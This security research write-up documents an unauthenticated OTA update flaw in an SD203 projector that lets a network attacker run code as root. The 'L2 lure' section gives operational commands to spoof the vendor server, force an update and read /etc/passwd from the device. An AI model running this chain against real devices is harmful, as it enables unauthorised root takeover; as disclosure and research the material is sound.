# 03 - OTA root path

## Summary

The OTA client downloads three files over plain HTTP and executes one of them
as root. There is no signature or certificate check, only MD5 values that the
same server supplies.

```text
ota_host_en / ota_host_cn
    |
    +-- GET http://<value>/config.txt       -> /tmp/config.txt
    +-- GET http://<value>/sd203ota.bin.gz  -> /tmp/sd203ota.bin.gz
    +-- GET http://<value>/otaunpack        -> /tmp/otaunpack
    +-- chmod 777 /tmp/otaunpack
    +-- fork(); execlp("otaunpack", "otaunpack", "-x", "/tmp/sd203ota.bin.gz")
```

Because `otaunpack` is executed through `execlp`, a shell script with a
`#!/bin/sh` shebang is executed by the shell as root. The real unpacker is
never called if the script does not call it, so no flash is written.

## Configuration keys

`libsd20x_msrv.so` reads `ota_host_cn` when `getlangid() == 7`, otherwise
`ota_host_en`. A key named `ota_host` without a suffix is not read.

This matters: `ota_host.cgi` writes only `ota_host`. Setting it does not
change the OTA host. Use the L2 responder described below instead.

The stored value is the complete host and path prefix, for example:

```text
43.254.2.156:8000/ota/rgl/sd203_6710_yro8__SSW105AT
```

The client appends the three file names to that string.

## Offsets in `libsd20x_msrv.so`

| Item | File offset |
|---|---:|
| `http://%s/config.txt` | `0xe746e` |
| `http://%s/sd203ota.bin.gz` | `0xe758b` |
| `http://%s/otaunpack` | `0xe75d6` |
| target `/tmp/config.txt` | `0xe73c8` |
| target `/tmp/sd203ota.bin.gz` | `0xe75a5` |
| `chmod 777 /tmp/otaunpack` | `0xe7674` |

The `chmod` runs through `sd20x_system` in `sd20x_ota_update`.

## Execution in `otasrv`

`otasrv` is stripped and partly Thumb-2, so function boundaries are
heuristic. The relevant ARM part:

- `main` checks `access("/tmp/otaunpack")` and
  `access("/tmp/sd203ota.bin.gz")`;
- it calls `fork()` at `0x13e88`;
- the child calls
  `execlp("otaunpack", "otaunpack", "-x", "/tmp/sd203ota.bin.gz")`
  at `0x13eb8`;
- the parent calls `waitpid()`;
- after the child exits, the parent runs `system("reboot")`.

Before the payload runs, `otakill_stop_services` stops the services, including
the vendor Boa. The payload therefore has to re-expose something itself.

`execlp` searches `PATH`, and `/tmp` is in the search path, which is why the
bare name `otaunpack` finds `/tmp/otaunpack`.

## What is checked

The container carries MD5 values (`MD5`, `MD5_OTA`) and a CRC32. There is no
signature and no certificate validation. A server that controls the download
also controls the expected MD5 values, so the check does not establish
authenticity.

## Vendor package

The vendor OTA host is `43.254.2.156:8000`. The model directory is
`/ota/rgl/sd203_6710_yro8__SSW105AT_1/`:

| File | Size | MD5 |
|---|---:|---|
| `config.txt` | 203 | `0a8a4b128baec91a45894df671af1e8f` |
| `otaunpack` | 50944 | `5d5ed480e0061efcf1df14870a1bd952` |
| `sd203ota.bin.gz` | 13441679 | `168dccb5be3cb8bb3661ebb076c3dbb8` |

The device's stored path lacks the `_1` suffix, so its own request returns
404. That is a vendor-side rename, not a firmware version mismatch.

## L2 lure

The device sends its OTA request to the vendor IP. To answer it without
touching the vendor:

1. Be the device's L2 next hop (typically run the access point it joins).
2. Set `net.ipv4.ip_forward=0` on the host. Otherwise the kernel forwards the
   packets to the real vendor and races the responder.
3. Run the HTTP lure, which creates `config.txt` with matching MD5 values:

   ```sh
   python3 tools/ota_lure_server.py \
       --root ./lure --payload payloads/otaunpack_root_boa.sh \
       --major 1 --minor 3 --small R
   ```

4. Run the userspace TCP responder. It spoofs the vendor source address at
   L2 and serves the files from `--root`:

   ```sh
   sudo python3 tools/ota_mitm.py --iface wlan0 --client 10.42.0.31
   ```

   No iptables or netfilter is needed. This is why the responder is a
   userspace TCP endpoint rather than a NAT rule.

5. Trigger one OTA check after the vendor Boa is back:

   ```sh
   python3 tools/trigger.py --target 10.42.0.31 --wait
   ```

   The trigger POSTs `updatetxt=1` to `/cgi-bin/ota_start.cgi`.

6. Read the root filesystem through the payload's Boa:

   ```sh
   curl http://10.42.0.31/etc/passwd
   curl http://10.42.0.31/proc/mounts
   curl http://10.42.0.31/tmp/ota_payload.log
   ```

## Live confirmation

The chain was confirmed on the reference device with a lure config reporting
`1.0.3R` and `force_update=true`:

- the device requested and downloaded `config.txt`, `sd203ota.bin.gz` and
  `otaunpack` (a 1933-byte shell script);
- the user saw `loading the update` on the beamer;
- the payload executed as root.

The root-Boa payload then served the root filesystem over HTTP. This is the
live confirmation for `payloads/otaunpack_root_boa.sh`.

The recon payload is only partially confirmed: the script ran as root, but no
callback arrived because `nc` and `wget` were not usable in that rootfs build.

## Failure modes

- **Payload blocks forever:** `otasrv` stays in `waitpid()` and never reaches
  `system("reboot")`. The device is unreachable until a power cycle. Every
  payload must terminate, and network attempts need timeouts.
- **Vendor Boa is stopped:** `otakill_stop_services` runs before the payload.
  A payload that does nothing leaves no web UI. The root-Boa payload starts a
  second Boa with `DocumentRoot /`.
- **Minimal rootfs:** `busybox` exists, but `telnetd`, `nc`, `httpd` and
  `wget` were not usable in the tested build. Do not depend on them.
- **No persistent change:** the root-Boa payload sleeps for 540 seconds, then
  exits. The vendor client reboots the device and normal service returns.

## Cleanup

Stop the responder, then restore the host's previous `ip_forward` value. The
L2 method does not modify the device's stored OTA configuration.

## Unknowns

- The root filesystem and MTD layout were not recovered from the OTA bundle.
- The exact scope of `otakill_stop_services` beyond Boa is not known.
- Whether port 8080 is free on every firmware build is not known; the root-Boa
  payload uses it as a fallback.
- The offsets above are file offsets from the recovered binaries, not source
  line numbers. `otasrv` is stripped, so its function boundaries are
  heuristic.
